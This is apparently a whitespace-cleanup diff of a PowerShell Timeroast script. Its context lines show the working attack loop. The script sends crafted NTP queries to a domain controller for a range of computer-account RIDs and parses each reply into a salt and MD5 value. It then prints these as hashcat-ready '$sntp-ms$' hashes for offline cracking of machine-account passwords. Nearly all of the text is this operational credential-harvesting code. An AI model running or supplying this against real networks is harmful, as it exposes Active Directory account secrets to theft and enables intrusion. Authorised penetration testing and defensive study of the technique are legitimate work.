@@ -21,9 +21,9 @@
 
 .PARAMETER minRID
     First RID to try. Useful to continue after an earlier partial Timeroast. Default is 0.
-    
+
 .PARAMETER maxRID
-    The highest RID to try. By default there is no limit other than the maximal possible RID. 
+    The highest RID to try. By default there is no limit other than the maximal possible RID.
     Regardless of whether this is set, the script will only terminate after no response has come in for TIMEOUT seconds.
 
 .PARAMETER rate
@@ -65,7 +65,7 @@ if ($outputFile) {
 }
 
 # Only a subset of queries gets a response. Alternate between sending and receiving and use the request rate as receive
-# timeout. If the DC is slower to respond than this rate that is fine. The response contains the RID it is associated 
+# timeout. If the DC is slower to respond than this rate that is fine. The response contains the RID it is associated
 # with so the sender is allowed to be ahead of the receiver.
 if ($port -eq 0) {
     $client = New-Object System.Net.Sockets.UdpClient
@@ -76,23 +76,23 @@ $client.Client.ReceiveTimeout = [Math]::floor(1000/$rate)
 $client.Connect($domainController, 123)
 
 $timeoutTime = (Get-Date).AddSeconds($timeout)
-for ($queryRid = $minRID; (Get-Date) -lt $timeoutTime; $queryRid++) {   
-    
+for ($queryRid = $minRID; (Get-Date) -lt $timeoutTime; $queryRid++) {
+
     # Request as long as the maximal RID hasn't been reached yet.
     if ($queryRid -le $maxRID) {
         $query = $NTP_PREFIX + [BitConverter]::GetBytes($queryRid) + [byte[]]::new(16)
         [void] $client.Send($query, $query.Length)
     }
-    
-    # Keep receiving responses until the total timeout.    
+
+    # Keep receiving responses until the total timeout.
     try {
         $reply = $client.Receive([ref]$null)
-        
+
         if ($reply.Length -eq 68) {
             $salt = [byte[]]$reply[0..47]
             $md5Hash = [byte[]]$reply[-16..-1]
             $answerRid = ([BitConverter]::ToUInt32($reply[-20..-16], 0) -bxor $keyFlag)
-            
+
             $hexSalt = [BitConverter]::ToString($salt).Replace("-", "").ToLower()
             $hexMd5Hash = [BitConverter]::ToString($md5Hash).Replace("-", "").ToLower()
             $hashcatHash = "{0}:`$sntp-ms`${1}`${2}" -f $answerRid, $hexMd5Hash, $hexSalt
@@ -101,10 +101,10 @@ for ($queryRid = $minRID; (Get-Date) -lt $timeoutTime; $queryRid++) {
             } else {
                 Write-Output $hashcatHash
             }
-            
+
             # Succesfull receive. Update total timeout.
             $timeoutTime = (Get-Date).AddSeconds($timeout)
-       }   
+       }
     }
     catch [System.Management.Automation.MethodInvocationException] {
         # Time for next request.
